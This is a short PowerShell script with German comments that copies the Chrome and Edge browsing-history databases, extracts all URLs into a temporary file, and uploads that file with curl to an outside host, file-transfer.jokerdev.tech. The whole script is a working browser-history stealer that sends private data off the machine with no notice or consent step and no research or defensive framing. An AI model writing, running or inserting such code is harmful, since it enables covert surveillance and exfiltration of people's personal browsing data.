# Ultra einfache Version
$outputFile = "$env:TEMP\browser_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

# Chrome
if (Test-Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History") {
    Copy-Item "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" "$env:TEMP\chrome.tmp" -Force
    Get-Content "$env:TEMP\chrome.tmp" -Raw | Select-String -Pattern 'https?://[^\s""<>]+' -AllMatches | ForEach-Object { $_.Matches.Value } | Out-File $outputFile -Append
    Remove-Item "$env:TEMP\chrome.tmp" -Force
}

# Edge  
if (Test-Path "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History") {
    Copy-Item "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" "$env:TEMP\edge.tmp" -Force
    Get-Content "$env:TEMP\edge.tmp" -Raw | Select-String -Pattern 'https?://[^\s""<>]+' -AllMatches | ForEach-Object { $_.Matches.Value } | Out-File $outputFile -Append
    Remove-Item "$env:TEMP\edge.tmp" -Force
}

# Upload mit cURL
if (Test-Path $outputFile) {
    $fileName = Split-Path $outputFile -Leaf
    curl -T $outputFile "https://file-transfer.jokerdev.tech/upload/$fileName"
}
